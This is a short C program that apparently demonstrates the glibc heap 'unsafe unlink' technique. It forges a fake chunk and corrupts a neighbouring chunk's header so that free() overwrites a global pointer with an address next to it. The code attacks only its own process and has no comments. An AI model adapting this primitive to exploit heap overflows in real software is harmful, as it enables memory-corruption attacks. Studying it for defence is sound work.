#include<unistd.h>
#include<string.h>
#include<stdio.h>
#include<stdlib.h>

unsigned long *target;
int main()
{
	unsigned long *p0,*p1;
	p0=malloc(0xa0);
	p1=malloc(0xa0);
	target=p0;
	printf("p0 @ %p\n",p0);
	printf("p1 @ %p\n",p1);
	printf("Target @ %p = %#lx\n",&target,target);
	target[2]=(unsigned long)(&target-3);
	target[3]=(unsigned long)(&target-2);
	target[4]=0;
	target[0]=0;
	target[1]=0xa0;
	p1[-2]=0xa0;
	p1[-1]=0xb0;
	free(p1);
	printf("Target @ %p = %#lx\n",&target,target);
}
